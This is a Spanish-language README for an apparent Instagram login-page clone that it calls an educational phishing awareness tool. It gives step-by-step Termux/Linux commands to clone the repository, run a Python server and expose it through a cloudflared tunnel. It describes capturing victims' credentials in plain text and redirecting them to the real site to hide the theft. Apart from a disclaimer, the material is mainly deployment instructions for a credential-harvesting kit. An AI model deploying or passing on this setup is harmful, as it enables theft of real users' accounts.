🛡️ ANDY TECHNOLOGY — IG AUDIT TOOL v2.0

> **Herramienta de Concientización y Prueba de Concepto (PoC) sobre Phishing e Ingeniería Social**

`IG Audit Tool v2.0` es un entorno de simulación diseñado para demostrar mecánicas de interceptación de credenciales en aplicaciones web mediante técnicas de suplantación de identidad. El objetivo principal es educar a usuarios e investigadores sobre cómo funcionan los vectores de ataque basados en ingeniería social y cómo detectarlos.

---

## ⚠️ AVISO LEGAL Y DESLINDE DE RESPONSABILIDAD

* **FINES EXCLUSIVAMENTE EDUCATIVOS:** Esta herramienta ha sido desarrollada únicamente para entornos de prueba autorizados, laboratorios de seguridad y auditorías de seguridad personal.
* **USO RESPONSABLE Y ÉTICO:** Queda estrictamente prohibido el uso de este software en objetivos, infraestructura o cuentas sin el consentimiento explícito y por escrito del propietario.
* **CUMPLIMIENTO LEGAL:** El acceso no autorizado a sistemas informáticos es un delito sancionado por leyes internacionales. El autor no se responsabiliza por el uso indebido o los daños derivados de la ejecución de este software.

---

## ⚙️ CARACTERÍSTICAS TÉCNICAS

* **Servidor backend en Python:** Interceptación y procesamiento de peticiones en tiempo real con interfaz de consola en banner ASCII.
* **Frontend responsivo:** Interfaz adaptada a navegadores móviles y de escritorio.
* **Persistencia local de logs:** Almacenamiento estructurado de registros de prueba en `registro_privado.txt`.
* **Compatibilidad:** Optimizado para entornos Linux/Termux e integración con túneles de retransmisión tipo Cloudflare (*cloudflared*).

---

## 🚀 INSTALACIÓN Y EJECUCIÓN (Laboratorio Termux / Linux)

### Paso 1: Actualización del sistema e instalación de dependencias

```bash
pkg update && pkg upgrade -y
pkg install python git cloudflared -y
git clone [https://github.com/Andyromerook1/andy-ig-clon](https://github.com/Andyromerook1/andy-ig-clon)
cd andy-ig-clon
Paso 2: Despliegue del servidor local (Terminal 1)
Intento
python server.py
Paso 3: Configuración del túnel de prueba (Terminal 2)
Intento
cloudflared tunnel --protocol http2 --url [http://127.0.0.1:8080](http://127.0.0.1:8080)
🔍 VECTOR DE ATAQUE Y MITIGACIÓN (Sección Educativa)
¿Cómo funciona el ataque?
Suplantación de Dominio: El atacante utiliza un servidor local expuesto a través de un túnel HTTPS (Cloudflare, Ngrok) para imitar la interfaz legítima de una plataforma.

Engaño Visual: La víctima no verifica la URL en la barra de direcciones e ingresa sus credenciales en el formulario suplantado.

Captura y Redirección: El servidor local procesa los datos ingresados, los almacena en texto plano y redirige a la víctima a la plataforma real para disimular el ataque.
